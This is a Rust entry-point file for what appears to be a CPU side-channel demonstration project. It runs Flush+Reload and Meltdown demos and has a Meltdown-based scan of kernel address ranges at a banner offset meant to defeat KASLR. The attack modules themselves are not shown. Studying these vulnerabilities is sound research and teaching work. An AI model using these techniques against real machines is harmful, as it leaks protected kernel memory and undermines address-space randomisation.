mod fr;
mod meltdown;
mod utils;

use fr::FlushReload;

use crate::meltdown::{Meltdown, MeltdownUS};
use clap::Parser;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// What to do? Choose between flush+reload or meltdown
    #[arg(short, long)]
    task: String,
}

fn main() {
    let args = Args::parse();

    match args.task.to_lowercase().trim() {
        "flush+reload" => flush_reload_demo(),
        "meltdown" => meltdown_demo(),
        "meltdown_kaslr" => meltdown_kaslr_demo(),
        _ => {}
    }
}

fn flush_reload_demo() {
    let channel = FlushReload::new();

    let secret_byte: u8 = 42;
    channel.leak(secret_byte);
    let guessed_byte = channel.get().unwrap();

    println!(
        "What was the guess after the leakage of {}? {}",
        secret_byte, guessed_byte
    );
    println!("The retrieval worked? {}", secret_byte == guessed_byte);
}

fn meltdown_demo() {
    let secret_byte: u8 = 42;

    let buf = vec![secret_byte; 1];
    let meltdown_attack = MeltdownUS::new();
    let read_byte = meltdown_attack.read(buf.as_ptr());
    println!(
        "The result of the meltdown attack was {} and {} was expected.",
        read_byte.unwrap(),
        secret_byte
    );
}

fn meltdown_kaslr_demo() {
    let start_range = 0xffff_ffff_8100_0000u64;
    let end_range = 0xffff_ffff_c100_0000u64;
    let banner_offset = 0xc00180u64;

    let meltdown_attack = MeltdownUS::new();
    for addr in (start_range + banner_offset..end_range + banner_offset).step_by(0x200000) {
        let addr = addr as *const u8;
        let potential_banner = (0..5)
            .map(|i| meltdown_attack.read(unsafe { addr.add(i) }))
            .collect::<Vec<_>>();
        println!("Potential banner: {:?}", potential_banner);
    }
}
